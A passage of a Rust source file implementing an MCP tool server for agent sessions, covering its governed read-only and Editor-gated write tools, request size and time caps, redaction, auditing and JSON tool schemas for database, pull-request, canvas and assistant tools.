//! `ottod mcp-tools` — the first-party Otto MCP tool server (Task B2b).
//! Nearly every tool here is **read-only**; the exceptions are
//! `canvas_create_scene` / `canvas_update_scene` (Task B5), the Vault v3
//! doc writers `otto_vault_write` / `otto_vault_rename` / `otto_vault_delete`,
//! the swarm board tools `swarm_create_task` / `swarm_update_task` /
//! `swarm_run_task` / `swarm_stop_run` (the manager's utilization levers),
//! `browser_navigate` (Task 6, opens a reader-mode browser tab), and the three
//! cloud-console writers `aws_athena_query` (starts an Athena query execution),
//! `aws_sqs_send` (produces one SQS message) and `k8s_action` (a kubectl
//! rollout/scale/delete/Argo verb, see `docs/design/aws-k8s-consoles.md` §4.6),
//! and the API-client writers `otto_api_execute` (sends one saved request),
//! `otto_api_upsert_request` (persists a saved request), and
//! `otto_api_run_automation` (runs a human-authored automation), and the Otto
//! Assistant tools `assistant_*` (advertised to `source: "assistant"` sessions
//! only; they write the owner's OWN assistant data — memories with Undo,
//! tasks, reminders — and open approvals, never an outward action themselves)
//! — which call the normal governed HTTP endpoints AS THE SESSION OWNER — the
//! same workspace-role check (`Editor`) a human gets, no more. Canvas is meant
//! to be agent-drawable, the vault is the agents' documentation home
//! (delete is a soft move to `.trash/`), the swarm board is how a manager
//! agent keeps its team utilized, a reader tab is the same one-URL "open
//! a tab" action the Browser module UI does, and the AWS/K8s writers are the
//! per-service `Edit`-gated console actions (`aws_athena:Edit`, `aws_sqs:Edit`,
//! `kubernetes:Edit` — destructive k8s actions additionally demand
//! `params.confirm_name == name` server-side); every other tool stays strictly
//! read-only (see "Safety properties" below).
//!
//! Otto exposes a slice of its own data to an agent session as MCP tools. When
//! `otto_mcp_enabled` is on (default), `otto-sessions` injects an `otto` server
//! whose command is `ottod mcp-tools`, carrying a **per-session token** — in the
//! workspace `.mcp.json` for Claude, or a per-session creds file (`--config`) for
//! Codex. claude/codex launch that command and speak MCP to it over stdio; this
//! process answers `initialize` / `tools/list` / `tools/call`, calling back into
//! the running daemon on 127.0.0.1 with the per-session token (which authorizes as
//! the session's owner, so workspace RBAC applies).
//!
//! **Control-plane parity.** The operator's MCP → Otto server checklist
//! (`GET /mcp/otto-server`, the governed `otto.*` catalog in
//! `otto_server::mcp_outward`) is ALSO surfaced here: every enabled governed
//! tool that this binary does not serve natively is advertised under the stdio
//! naming (`otto.create_pr` → `otto_create_pr`) and its calls are proxied
//! through `POST /mcp/otto-tools/invoke` — the same allow-list → approval →
//! audit choke point the outward server uses, so a mutating tool such as
//! `otto_create_pr` still waits on a human approval. Native tools win by name
//! (see `governed_tools_for`), so what the control plane shows as enabled is
//! what a session can call, with no second hand-maintained list to drift.
//!
//! The Design Hall WRITES (`otto_design_assist` — start an agent turn that
//! commits a version, `otto_design_link` — file an explicit link) are
//! deliberately NOT native: they exist only as that governed bridge, so they
//! stay approval-gated (DANGEROUS) unless the operator exempts them, and no
//! tool approves a design version (humans only).
//!
//! Beyond Otto's own data, the DB tools (`otto_list_connections`,
//! `otto_db_schema`/`_children`/`_object`, `otto_db_query`) expose the user's
//! database **connections**: schema introspection and **read-only** queries.
//!
//! Safety properties:
//! - **Read-only, with named exceptions** — all upstream calls are `GET`s, or
//!   `POST`s to a hard-coded allow-list of **read-only-enforced** endpoints. The
//!   DB query path, `…/db/mcp-query`, refuses any write/DDL server-side
//!   (`run_read_only`) before a driver runs, independent of the connection's
//!   write-guard; the other read POSTs are `…/memory/search`, the vault
//!   `…/vault/vaults/{id}/search` / `…/okf/validate`, `…/browser/summarize`
//!   (Editor-gated but doesn't persist anything — the summarize session is
//!   ephemeral and never saved; see `routes/browser.rs`), and the SQS
//!   `…/sqs/queues/peek` (a `receive-message` with visibility timeout 0 —
//!   graded `aws_sqs:View` by the policy table because nothing is consumed).
//!   `canvas_create_scene`/`canvas_update_scene`, `otto_vault_write`/
//!   `otto_vault_rename`/`otto_vault_delete`, `browser_navigate`, and the
//!   cloud-console writers `aws_athena_query`/`aws_sqs_send`/`k8s_action`, plus
//!   `otto_api_execute` (ONE real HTTP request through a saved workspace request;
//!   Editor-gated, SSRF-guarded, secrets resolved server-side and scrubbed from
//!   the result), `otto_api_upsert_request` (persists a saved request), and
//!   `otto_api_run_automation` (runs a human-authored automation), are the ONLY
//!   tools that mutate persisted or remote state: they hit the
//!   normal governed HTTP routes, which apply the same `WorkspaceRole::Editor`
//!   / per-feature `Edit` gate a human caller hits — the token can only do what
//!   the session's owner is already allowed to do (and vault delete only
//!   trashes, never destroys).
//! - **Capped** — each upstream call has a wall-clock timeout; the response body
//!   is size-capped before parsing, and JSON arrays are row-capped.
//! - **Redacted** — every tool result is passed through `otto_core::redact` so
//!   tokens/PII never reach the agent transcript (the query path also masks cells
//!   server-side).
//! - **Audited** — every call appends a row to `mcp_tool_calls` (best-effort).
//!
//! The transport is newline-delimited JSON-RPC 2.0 (one JSON object per line on
//! stdin/stdout), which is the MCP stdio framing claude/codex use.

use std::time::Duration;

use otto_core::redact::redact_json;
use otto_state::{McpAuditRepo, NewMcpToolCall};
use serde_json::{json, Value};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};

use crate::config::Config;

/// Protocol version we advertise in `initialize`. Mirrors the spec revision the
/// bundled CLIs negotiate; clients echo their own and tolerate a match.
const PROTOCOL_VERSION: &str = "2024-11-05";

/// Per-call wall-clock timeout for an upstream daemon request.
const CALL_TIMEOUT: Duration = Duration::from_secs(20);
/// Hard cap on an upstream response body we will buffer + parse (1 MiB). Larger
/// bodies are rejected rather than streamed into an agent's context.
const MAX_BODY_BYTES: usize = 1024 * 1024;
/// Cap on the number of elements kept from any top-level / nested JSON array in
/// a tool result, so a huge schema/list can't blow the transcript. A truncation
/// marker is appended when the cap bites.
const MAX_ROWS: usize = 500;
/// Cap on the `text` a plain-text tool result (`k8s_logs`) hands the agent —
/// 256 KiB, roughly a few thousand log lines. The daemon's own non-follow log
/// cap is 5 MiB (`docs/design/aws-k8s-consoles.md` §3.2), so [`Ctx::get_text`]
/// buffers up to that and this trims the transcript-facing copy, keeping the
/// **tail** (the newest lines — the ones an agent debugging a pod wants).
const MAX_TEXT_CHARS: usize = 256 * 1024;
/// Body cap for [`Ctx::get_text`]: the daemon's 5 MiB log cap plus headroom.
const MAX_TEXT_BODY_BYTES: usize = 6 * 1024 * 1024;
/// Wall-clock timeout for a text (log) fetch: the non-follow logs route itself
/// runs kubectl with a 60 s timeout, so a 20 s cap would time out first.
const TEXT_CALL_TIMEOUT: Duration = Duration::from_secs(65);

/// Runtime context shared by all tool handlers.
struct Ctx {
    http: reqwest::Client,
    /// Base URL of the running daemon, e.g. `http://127.0.0.1:7700`.
    base: String,
    /// Per-session bearer token (the `OTTO_MCP_TOKEN` env value). Authorizes as
    /// the session's owner against the governed `/api/v1` routes — read-only
    /// for every tool except `canvas_create_scene`/`canvas_update_scene`, which
    /// it also authorizes to write (see the module doc's "Safety properties").
    token: String,
    /// Calling agent session id (for audit + RBAC scoping). May be empty.
    session_id: Option<String>,
    /// Calling workspace id (for audit). May be empty.
    workspace_id: Option<String>,
    /// Session metadata source. Review sessions use this to receive a
    /// read-only Vault catalog and a dispatcher-level mutation deny.
    source: Option<String>,
    /// Audit sink. `None` when the DB can't be opened (audit degrades to logs).
    audit: Option<McpAuditRepo>,
}

impl Ctx {
    /// GET an `/api/v1` path with the bearer token, enforcing the call timeout
    /// and the body-size cap, returning parsed JSON. Read-only by construction —
    /// this is the ONLY upstream verb the tools use.
    async fn get_json(&self, path: &str) -> Result<Value, String> {
        let url = format!("{}/api/v1{}", self.base.trim_end_matches('/'), path);
        let resp = tokio::time::timeout(
            CALL_TIMEOUT,
            self.http
                .get(&url)
                .bearer_auth(&self.token)
                .header(
                    "X-Otto-Session",
                    self.session_id.clone().unwrap_or_default(),
                )
                .send(),
        )
        .await
        .map_err(|_| format!("upstream timeout after {}s", CALL_TIMEOUT.as_secs()))?
        .map_err(|e| format!("request failed: {e}"))?;

        let status = resp.status();
        // Read the body with a size cap. reqwest's `bytes()` would buffer the
        // whole thing; we guard on Content-Length first, then re-check the actual
        // length (a server may omit/lie about the header).
        if let Some(len) = resp.content_length() {
            if len as usize > MAX_BODY_BYTES {
                return Err(format!(
                    "response too large ({len} bytes > {MAX_BODY_BYTES} cap)"
                ));
            }
        }
        let body = resp.bytes().await.map_err(|e| format!("read body: {e}"))?;
        if body.len() > MAX_BODY_BYTES {
            return Err(format!(
                "response too large ({} bytes > {MAX_BODY_BYTES} cap)",
                body.len()
            ));
        }
        if !status.is_success() {
            return Err(daemon_error(status, &body));
        }
        parse_ok_body(&body)
    }

    /// POST an `/api/v1` path with the bearer token. Used by the governed gateway
    /// proxy AND by the read-only DB tools (`otto_db_children` / `otto_db_object` /
    /// `otto_db_query`), which post to **read-only-enforced** endpoints — the
    /// `…/db/mcp-query` route refuses any write/DDL server-side before a driver runs.
    /// Same body-size cap as [`Self::get_json`] so a large result can't blow the
    /// agent transcript.
    async fn post_json(&self, path: &str, body: &Value) -> Result<Value, String> {
        self.post_json_within(path, body, CALL_TIMEOUT).await
    }

    /// [`Self::post_json`] with an explicit wall-clock budget — for calls whose
    /// route legitimately runs longer than [`CALL_TIMEOUT`] (a saved API request
    /// with its own `timeout_ms`, an automation, a governed call that first
    /// waits on a human approval).
    async fn post_json_within(
        &self,
        path: &str,
        body: &Value,
        budget: Duration,
    ) -> Result<Value, String> {
        let url = format!("{}/api/v1{}", self.base.trim_end_matches('/'), path);
        let resp = tokio::time::timeout(
            budget,
            self.http
                .post(&url)
                .timeout(budget)
                .bearer_auth(&self.token)
                .header(
                    "X-Otto-Session",
                    self.session_id.clone().unwrap_or_default(),
                )
                .json(body)
                .send(),
        )
        .await
        .map_err(|_| format!("upstream timeout after {}s", budget.as_secs()))?
        .map_err(|e| format!("request failed: {e}"))?;
        let status = resp.status();
        if let Some(len) = resp.content_length() {
            if len as usize > MAX_BODY_BYTES {
                return Err(format!(
                    "response too large ({len} bytes > {MAX_BODY_BYTES} cap)"
                ));
            }
        }
        let bytes = resp.bytes().await.map_err(|e| format!("read body: {e}"))?;
        if bytes.len() > MAX_BODY_BYTES {
            return Err(format!(
                "response too large ({} bytes > {MAX_BODY_BYTES} cap)",
                bytes.len()
            ));
        }
        if !status.is_success() {
            return Err(daemon_error(status, &bytes));
        }
        parse_ok_body(&bytes)
    }

    /// PUT an `/api/v1` path with the bearer token. Used ONLY by
    /// `canvas_update_scene` — the one mutating call site that isn't a POST.
    /// Same size cap / error handling as [`Self::post_json`].
    async fn put_json(&self, path: &str, body: &Value) -> Result<Value, String> {
        let url = format!("{}/api/v1{}", self.base.trim_end_matches('/'), path);
        let resp = tokio::time::timeout(
            CALL_TIMEOUT,
            self.http
                .put(&url)
                .bearer_auth(&self.token)
                .header(
                    "X-Otto-Session",
                    self.session_id.clone().unwrap_or_default(),
                )
                .json(body)
                .send(),
        )
        .await
        .map_err(|_| "upstream timeout".to_string())?
        .map_err(|e| format!("request failed: {e}"))?;
        let status = resp.status();
        if let Some(len) = resp.content_length() {
            if len as usize > MAX_BODY_BYTES {
                return Err(format!(
                    "response too large ({len} bytes > {MAX_BODY_BYTES} cap)"
                ));
            }
        }
        let bytes = resp.bytes().await.map_err(|e| format!("read body: {e}"))?;
        if bytes.len() > MAX_BODY_BYTES {
            return Err(format!(
                "response too large ({} bytes > {MAX_BODY_BYTES} cap)",
                bytes.len()
            ));
        }
        if !status.is_success() {
            return Err(daemon_error(status, &bytes));
        }
        parse_ok_body(&bytes)
    }

    /// PATCH an `/api/v1` path with the bearer token. Used by the swarm write
    /// tools (`swarm_update_task`) — same governed Editor-gated routes the UI
    /// hits; same timeout/size handling as [`Self::put_json`].
    async fn patch_json(&self, path: &str, body: &Value) -> Result<Value, String> {
        let url = format!("{}/api/v1{}", self.base.trim_end_matches('/'), path);
        let resp = tokio::time::timeout(
            CALL_TIMEOUT,
            self.http
                .patch(&url)
                .bearer_auth(&self.token)
                .header(
                    "X-Otto-Session",
                    self.session_id.clone().unwrap_or_default(),
                )
                .json(body)
                .send(),
        )
        .await
        .map_err(|_| "upstream timeout".to_string())?
        .map_err(|e| format!("request failed: {e}"))?;
        let status = resp.status();
        if let Some(len) = resp.content_length() {
            if len as usize > MAX_BODY_BYTES {
                return Err(format!(
                    "response too large ({len} bytes > {MAX_BODY_BYTES} cap)"
                ));
            }
        }
        let bytes = resp.bytes().await.map_err(|e| format!("read body: {e}"))?;
        if bytes.len() > MAX_BODY_BYTES {
            return Err(format!(
                "response too large ({} bytes > {MAX_BODY_BYTES} cap)",
                bytes.len()
            ));
        }
        if !status.is_success() {
            return Err(daemon_error(status, &bytes));
        }
        parse_ok_body(&bytes)
    }

    /// DELETE an `/api/v1` path with the bearer token. Used ONLY by
    /// `otto_vault_delete` — a soft delete (the daemon moves the note into the
    /// vault's `.trash/`, never destroying files). Same error handling as
    /// [`Self::post_json`]; tolerates an empty (204) body.
    async fn delete_ok(&self, path: &str) -> Result<(), String> {
        let url = format!("{}/api/v1{}", self.base.trim_end_matches('/'), path);
        let resp = tokio::time::timeout(
            CALL_TIMEOUT,
            self.http
                .delete(&url)
                .bearer_auth(&self.token)
                .header(
                    "X-Otto-Session",
                    self.session_id.clone().unwrap_or_default(),
                )
                .send(),
        )
        .await
        .map_err(|_| "upstream timeout".to_string())?
        .map_err(|e| format!("request failed: {e}"))?;
        let status = resp.status();
        if status.is_success() {
            return Ok(());
        }
        let bytes = resp.bytes().await.unwrap_or_default();
        Err(daemon_error(status, &bytes))
    }

    /// GET an `/api/v1` path that answers `text/plain` (today only the pod-logs
    /// route behind `k8s_logs`). Same bearer/session headers as
    /// [`Self::get_json`]; a larger body cap ([`MAX_TEXT_BODY_BYTES`]) and a
    /// longer timeout because the route shells out to `kubectl logs` with its
    /// own 60 s budget. Returns `(text, truncated)` — the text is trimmed to
    /// [`MAX_TEXT_CHARS`] keeping the **tail**, on a line boundary when one is
    /// near, so the newest lines survive.
    async fn get_text(&self, path: &str) -> Result<(String, bool), String> {
        let url = format!("{}/api/v1{}", self.base.trim_end_matches('/'), path);
        let resp = tokio::time::timeout(
            TEXT_CALL_TIMEOUT,
            self.http
                .get(&url)
                // The client's default 20 s timeout would cut the 60 s kubectl
                // budget short; a per-request timeout overrides it.
                .timeout(TEXT_CALL_TIMEOUT)
                .bearer_auth(&self.token)
                .header(
                    "X-Otto-Session",
                    self.session_id.clone().unwrap_or_default(),
                )
                .send(),
        )
        .await
        .map_err(|_| format!("upstream timeout after {}s", TEXT_CALL_TIMEOUT.as_secs()))?
        .map_err(|e| format!("request failed: {e}"))?;
        let status = resp.status();
        if let Some(len) = resp.content_length() {
            if len as usize > MAX_TEXT_BODY_BYTES {
                return Err(format!(
                    "response too large ({len} bytes > {MAX_TEXT_BODY_BYTES} cap)"
                ));
            }
        }
        let body = resp.bytes().await.map_err(|e| format!("read body: {e}"))?;
        if body.len() > MAX_TEXT_BODY_BYTES {
            return Err(format!(
                "response too large ({} bytes > {MAX_TEXT_BODY_BYTES} cap)",
                body.len()
            ));
        }
        if !status.is_success() {
            return Err(daemon_error(status, &body));
        }
        let text = String::from_utf8_lossy(&body);
        Ok(tail_text(&text, MAX_TEXT_CHARS))
    }

    /// The governed downstream tools the live-agent **gateway** exposes for this
    /// session's workspace, namespaced `mcp__<server>__<tool>`. Best-effort: an
    /// empty list (gateway off, no workspace, or the session user lacks MCP
    /// access) leaves the inward catalog unchanged.
    async fn gateway_tools(&self) -> Vec<Value> {
        let Some(ws) = &self.workspace_id else {
            eprintln!(
                "ottod mcp-tools: gateway tools skipped — session has no workspace_id; \
                 only the static read-only catalog is advertised"
            );
            return vec![];
        };
        match self
            .get_json(&format!("/mcp/gateway/tools?workspace_id={}", seg(ws)))
            .await
        {
            Ok(v) => v
                .get("tools")
                .and_then(Value::as_array)
                .cloned()
                .unwrap_or_default(),
            // Swallowing this silently made the advertised tool list vary between
            // otherwise-identical runs with no trace: when the gateway answered,
            // agents saw the downstream write tools; when it errored they saw a
            // read-only catalog and correctly reported the tool "missing". Same
            // code, same token, different answer — and nothing to grep for. Still
            // best-effort (the static catalog stands on its own), but never quiet.
            Err(e) => {
                eprintln!(
                    "ottod mcp-tools: gateway tools unavailable for workspace {ws}: {e} — \
                     advertising the static read-only catalog only; write tools \
                     (e.g. comment_pr) will NOT appear on this stdio surface"
                );
                vec![]
            }
        }
    }

    /// The full `otto.*` names the operator has ENABLED in the control plane
    /// (`GET /mcp/otto-server`, MCP View). `None` when the daemon can't answer —
    /// then no governed tool is advertised or callable, and the reason is on
    /// stderr, so "the control plane says X but the session can't see it" is
    /// always explainable from the daemon's log.
    async fn governed_enabled(&self) -> Option<Vec<String>> {
        match self.get_json("/mcp/otto-server").await {
            Ok(v) => Some(
                v["tools"]
                    .as_array()
                    .map(|tools| {
                        tools
                            .iter()
                            .filter(|t| t["enabled"].as_bool().unwrap_or(false))
                            .filter_map(|t| t["name"].as_str().map(str::to_string))
                            .collect()
                    })
                    .unwrap_or_default(),
            ),
            Err(e) => {
                eprintln!(
                    "ottod mcp-tools: control-plane tool list unavailable: {e} — governed \
                     otto.* tools (e.g. otto_create_pr) will NOT appear on this stdio surface"
                );
                None
            }
        }
    }

    /// Append a best-effort audit row for one tool call. Failures are logged to
    /// stderr (never stdout — that's the protocol channel) and swallowed.
    async fn audit(&self, tool: &str, args: &Value, ok: bool, rows: Option<i64>) {
        let Some(audit) = &self.audit else {
            return;
        };
        // The arguments are redacted before persisting (defense-in-depth: a
        // caller could pass a secret-looking value).
        let args_json = redact_json(args).value.to_string();
        if let Err(e) = audit
            .record(NewMcpToolCall {
                workspace_id: self.workspace_id.clone(),
                session_id: self.session_id.clone(),
                tool: tool.to_string(),
                args_json,
                ok,
                rows,
            })
            .await
        {
            eprintln!("ottod mcp-tools: audit insert failed: {e}");
        }
    }
}

/// Cap on a daemon error MESSAGE surfaced to the agent. Larger than the raw
/// snippet cap because some messages are the actionable part — a repo
/// reference that did not resolve lists the candidates to pick from.
const MAX_ERROR_MESSAGE_CHARS: usize = 4000;

/// The agent-facing text for a non-2xx daemon reply. A JSON `Problem`
/// (`{code, message}`, or a module's `{error}`) surfaces that message (capped at
/// [`MAX_ERROR_MESSAGE_CHARS`]); anything else is a raw 300-char snippet so a
/// huge body never reaches the transcript. The status stays in front — it is
/// the actionable part when the message is terse.
fn daemon_error(status: reqwest::StatusCode, body: &[u8]) -> String {
    let message = serde_json::from_slice::<Value>(body).ok().and_then(|v| {
        v.get("message")
            .or_else(|| v.get("error"))
            .and_then(Value::as_str)
            .map(str::to_string)
    });
    match message {
        Some(m) => format!(
            "daemon returned {status}: {}",
            m.chars().take(MAX_ERROR_MESSAGE_CHARS).collect::<String>()
        ),
        None => format!(
            "daemon returned {status}: {}",
            String::from_utf8_lossy(body)
                .chars()
                .take(300)
                .collect::<String>()
        ),
    }
}

/// Parse a 2xx daemon body. An EMPTY body (`204 No Content` — e.g. a Jira
/// transition, a delete) is a success, not a "parse json: EOF" error the agent
/// would read as a failure and retry: it becomes `{"ok": true}`.
fn parse_ok_body(body: &[u8]) -> Result<Value, String> {
    if body.iter().all(u8::is_ascii_whitespace) {
        return Ok(json!({ "ok": true }));
    }
    serde_json::from_slice(body).map_err(|e| format!("parse json: {e}"))
}

/// Recursively cap the number of elements in every JSON array to [`MAX_ROWS`],
/// appending a string marker element when truncation happens. Returns the capped
/// value and the largest array length seen (used as the audited `rows`).
fn cap_rows(v: Value, max_seen: &mut usize) -> Value {
    match v {
        Value::Array(items) => {
            let n = items.len();
            if n > *max_seen {
                *max_seen = n;
            }
            let truncated = n > MAX_ROWS;
            let mut out: Vec<Value> = items
                .into_iter()
                .take(MAX_ROWS)
                .map(|i| cap_rows(i, max_seen))
                .collect();
            if truncated {
                out.push(Value::String(format!(
                    "[otto: truncated — {n} items, showing first {MAX_ROWS}]"
                )));
            }
            Value::Array(out)
        }
        Value::Object(map) => Value::Object(
            map.into_iter()
                .map(|(k, val)| (k, cap_rows(val, max_seen)))
                .collect(),
        ),
        other => other,
    }
}

/// Keep at most `max` chars of `text`, preferring the **tail** (newest log
/// lines). When the cut lands mid-line and a newline is within the first 512
/// chars of the kept window, start at that line instead so the first line isn't
/// a fragment. Returns `(text, truncated)`.
fn tail_text(text: &str, max: usize) -> (String, bool) {
    let n = text.chars().count();
    if n <= max {
        return (text.to_string(), false);
    }
    let skip = n - max;
    let start = text
        .char_indices()
        .nth(skip)
        .map(|(i, _)| i)
        .unwrap_or(text.len());
    let mut kept = &text[start..];
    // Byte-index scan bounded to the first 512 bytes, char-boundary safe.
    if let Some((nl, _)) = kept
        .char_indices()
        .take_while(|(i, _)| *i < 512)
        .find(|(_, c)| *c == '\n')
    {
        kept = &kept[nl + 1..];
    }
    (kept.to_string(), true)
}

/// The static tool catalog returned by `tools/list`. Kept in one place so the
/// `tools/call` dispatch and the advertised schema can't drift.
/// The full native catalog: the static first-party tools plus the Otto
/// Assistant tools (which [`tool_catalog_for_source`] shows only to
/// assistant sessions).
fn tool_catalog() -> Value {
    let mut catalog = base_tool_catalog();
    if let Some(tools) = catalog["tools"].as_array_mut() {
        tools.extend(assistant_tool_specs());
    }
    catalog
}

// ---------------------------------------------------------------------------
// Otto Assistant tools (native; only advertised to `source: "assistant"`
// sessions). Each posts to `POST /assistant/agent/{tool}` AS THE SESSION
// OWNER with this session's id; the daemon resolves the session to its
// assistant thread (the token's session binding wins over the body), so a
// session can only ever act for its own thread. They write only the owner's
// own assistant data (memories with chips + Undo, tasks, reminders); the
// outward-action tool OPENS an approval, it never performs the action.
// ---------------------------------------------------------------------------

/// `(native tool name, /assistant/agent/{tool} segment)`.
const ASSISTANT_TOOLS: [(&str, &str); 8] = [
    ("assistant_remember", "remember"),
    ("assistant_forget", "forget"),
    ("assistant_recall", "recall"),
    ("assistant_create_reminder", "reminder"),
    ("assistant_create_task", "task"),
    ("assistant_update_task", "task_update"),
    ("assistant_delegate", "delegate"),
    ("assistant_request_approval", "approval"),
];

/// The session source that sees the assistant tools.
const ASSISTANT_SOURCE: &str = "assistant";

fn assistant_tool_specs() -> Vec<Value> {
    vec![
        json!({
            "name": "assistant_remember",
            "description": "Otto Assistant: save ONE short, atomic fact about the user (a preference, a person, a recurring plan). Never store secrets. The user sees it as a chip with Undo; with memory approval on it waits for their review.",
            "inputSchema": { "type": "object", "properties": {
                "text": { "type": "string" },
                "kind": { "type": "string", "description": "fact | decision | learning … (default fact)" },
                "tags": { "type": "array", "items": { "type": "string" } }
            }, "required": ["text"] }
        }),
        json!({
            "name": "assistant_forget",
            "description": "Otto Assistant: forget the user's memories matching `query` (\"forget my old address\"). Up to 10 go; the user can undo. Say what was forgotten.",
            "inputSchema": { "type": "object", "properties": { "query": { "type": "string" } }, "required": ["query"] }
        }),
        json!({
            "name": "assistant_recall",
            "description": "Otto Assistant: read the user's profile and the memories matching `query` (omit it for the most recent). Use before answering anything personal.",
            "inputSchema": { "type": "object", "properties": {
                "query": { "type": "string" },
                "k": { "type": "integer", "minimum": 1, "maximum": 20 }
            } }
        }),
        json!({
            "name": "assistant_create_reminder",
            "description": "Otto Assistant: remind the user at `run_at` (RFC3339, or local `YYYY-MM-DDTHH:MM` in `timezone`, default the Mac's). Delivered into this thread and as a notification.",
            "inputSchema": { "type": "object", "properties": {
                "text": { "type": "string" },
                "run_at": { "type": "string" },
                "timezone": { "type": "string", "description": "IANA name, e.g. Asia/Jerusalem" }
            }, "required": ["text", "run_at"] }
        }),
        json!({
            "name": "assistant_create_task",
            "description": "Otto Assistant: open a task card for a longer job (it starts `running`). Keep it current with assistant_update_task.",
            "inputSchema": { "type": "object", "properties": {
                "title": { "type": "string" },
                "detail": { "type": "string" }
            }, "required": ["title"] }
        }),
        json!({
            "name": "assistant_update_task",
            "description": "Otto Assistant: move a task you created to `running`, `needs_you` (with a `question`, optional `options`), `done` or `failed` (optional `result` object).",
            "inputSchema": { "type": "object", "properties": {
                "task_id": { "type": "string" },
                "state": { "type": "string", "enum": ["running", "needs_you", "done", "failed"] },
                "question": { "type": "string" },
                "options": { "type": "array", "items": { "type": "string" } },
                "result": { "type": "object" }
            }, "required": ["task_id", "state"] }
        }),
        json!({
            "name": "assistant_delegate",
            "description": "Otto Assistant: hand a directive to one of the user's Personal Agents (`agent` = its id or exact name). It runs in the background; its summary is posted back into this thread. Tell the user who you asked.",
            "inputSchema": { "type": "object", "properties": {
                "agent": { "type": "string" },
                "directive": { "type": "string" }
            }, "required": ["agent", "directive"] }
        }),
        json!({
            "name": "assistant_request_approval",
            "description": "Otto Assistant: REQUIRED before anything outward (send, post, publish, purchase, delete, submit a form, anything touching production). State `where` it goes, `what` is sent, `who_sees` it and your `reason`; add `tool` + `destination` when known and a `category`. Returns `approved`, `denied` or `pending` (pass `wait_seconds` ≤ 30 to wait). Proceed ONLY on approved.",
            "inputSchema": { "type": "object", "properties": {
                "where": { "type": "string" },
                "what": { "type": "string" },
                "who_sees": { "type": "string" },
                "reason": { "type": "string" },
                "tool": { "type": "string" },
                "destination": { "type": "string" },
                "category": { "type": "string", "enum": ["send", "post", "publish", "purchase", "delete", "submit", "prod", "other"] },
                "wait_seconds": { "type": "integer", "minimum": 0, "maximum": 30 }
            }, "required": ["where", "what", "who_sees", "reason"] }
        }),
    ]
}

/// The `/assistant/agent/{tool}` segment of a native assistant tool name.
fn assistant_segment(name: &str) -> Option<&'static str> {
    ASSISTANT_TOOLS
        .iter()
        .find_map(|(n, seg)| (*n == name).then_some(*seg))
}

fn base_tool_catalog() -> Value {
    json!({
        "tools": [
            {
                "name": "otto_list_connections",
                "description": "Read-only: the database connections across EVERY workspace you can read — `{connections}` with id, name, kind, environment, read_only, workspace_id + workspace_name (this session's workspace first). A connection may live in another workspace, so look here before concluding it is missing. The DB tools take a connection's id OR name. Only queryable DB kinds are listed (mysql, postgres, redis, mongodb, clickhouse).",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "kind": { "type": "string", "description": "Optional filter to one kind: mysql | postgres | redis | mongodb | clickhouse." },
                        "workspace_id": { "type": "string", "description": WS_DIR_DESC }
                    }
                }
            },
            {
                "name": "otto_db_schema",
                "description": "Read-only: the TOP of a connection's schema tree — databases (SQL/Mongo) or keyspaces (Redis). Returns structure only, no row data. Each node carries an `id` (a NodePath) you pass to otto_db_children / otto_db_object.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "connection_id": { "type": "string", "description": "Otto connection id or name (a DB-kind connection)." }
                    },
                    "required": ["connection_id"]
                }
            },
            {
                "name": "otto_db_children",
                "description": "Read-only: expand ONE node of a connection's schema tree (engine-agnostic, lazy). `path` is a NodePath from otto_db_schema/otto_db_children — e.g. 'db:shop' → its folders, 'db:shop/folder:tables' → its tables, 'db:shop/folder:tables/table:orders' → its columns. Redis: 'kdb:0' → key prefixes (optional `filter`).",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "connection_id": { "type": "string", "description": "Otto connection id or name (otto_list_connections)." },
                        "path": { "type": "string", "description": "NodePath of the node to expand, e.g. 'db:shop/folder:tables'." },
                        "filter": { "type": "string", "description": "Optional substring/prefix filter (e.g. a Redis key prefix)." }
                    },
                    "required": ["connection_id", "path"]
                }
            },
            {
                "name": "otto_db_object",
                "description": "Read-only: the FULL structure of one table/collection — columns (name + type), primary key, indexes, foreign keys, and the CREATE/DDL where the engine exposes it. `path` is the object's NodePath, e.g. 'db:shop/folder:tables/table:orders'.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "connection_id": { "type": "string", "description": "Otto connection id or name (otto_list_connections)." },
                        "path": { "type": "string", "description": "NodePath of the table/collection." }
                    },
                    "required": ["connection_id", "path"]
                }
            },
            {
                "name": "otto_db_query",
                "description": "Run a READ-ONLY query against a connection and return rows {columns, rows, truncated}. SQL (mysql/postgres/clickhouse): a SELECT/SHOW/DESCRIBE/EXPLAIN/WITH statement. Redis: a read command per line (GET/HGETALL/SCAN/…). Mongo: a find/aggregate. Writes/DDL are REFUSED server-side. `database` scopes the active database (SQL/Mongo); Redis selects a keyspace via `node` 'kdb:N'. `max_rows` caps rows (server hard cap 200).",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "connection_id": { "type": "string", "description": "Otto connection id or name (otto_list_connections)." },
                        "statement": { "type": "string", "description": "The read-only statement / command." },
                        "database": { "type": "string", "description": "Optional active database to scope SQL/Mongo execution." },
                        "node": { "type": "string", "description": "Optional raw node context (e.g. 'kdb:0' for a Redis keyspace); overrides `database`." },
                        "max_rows": { "type": "integer", "description": "Optional row cap (clamped to 200)." }
                    },
                    "required": ["connection_id", "statement"]
                }
            },
            {
                "name": "otto_git_pr_review",
                "description": "Read-only: a pull request (state, reviewers, approvals, comments) plus Otto's multi-agent review runs of it (`reviews[]`: id, status, verdict, blocker_count — the `review_id` otto_list_findings takes; empty when none ran).",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "repo_id": { "type": "string", "description": REPO_REF_DESC },
                        "pr_number": { "type": "integer", "description": "Pull request number." }
                    },
                    "required": ["pr_number"]
                }
            },
            {
                "name": "otto_product_story",
                "description": "Read-only: a product story context bundle (the story record and its latest agent-ready inject context) by story id.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "story_id": { "type": "string", "description": "Otto product story id, or its Jira key (e.g. GS-123) / exact title." }
                    },
                    "required": ["story_id"]
                }
            },
            {
                "name": "canvas_list_scenes",
                "description": "Read-only: list the Canvas Studio scenes (id/title/format/section/timestamps) in a workspace (default: this session's). Use canvas_create_scene to draw a new one.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "workspace_id": { "type": "string", "description": "Optional workspace id or name (default: this session's)." }
                    }
                }
            },
            {
                "name": "canvas_get_scene",
